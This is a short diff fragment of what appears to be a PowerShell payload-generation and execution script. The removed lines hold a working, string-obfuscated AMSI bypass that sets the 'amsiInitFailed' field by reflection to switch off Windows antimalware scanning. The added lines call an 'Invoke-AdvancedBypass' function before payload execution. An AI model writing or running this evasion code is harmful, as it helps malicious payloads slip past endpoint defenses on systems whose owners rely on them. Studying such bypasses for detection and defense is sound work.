-  # skipped (e.g. fresh runspace) or the field was reset.
-  try {
-    $__a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
-    $__b = [String]::Join('', 'am','siIn','itF','ailed')
-    $__t = [Ref].Assembly.GetType($__a)
-    if ($__t) {
-      $__f = $__t.GetField($__b, 'NonPublic,Static')
-      if ($__f) { $__f.SetValue($null, $true) }
-    }
-  } catch { }
-  ########## AMSI BYPASS ##########
-  
+  ########## END RETURN GENERATED PAYLOADS ##########
+
+  ########## PRE-EXECUTION BYPASS ##########
+  Invoke-AdvancedBypass
+  ########## END PRE-EXECUTION BYPASS ##########
+
   ########## EXECUTION ##########
   $Output = $null
   try
@@ -974,5 +1046,5 @@ Examples:
       else{[io.file]::WriteAllBytes($of,$Output)}
     }
   }
-  ########## EXECUTION ##########
+  ########## END EXECUTION ##########
 }
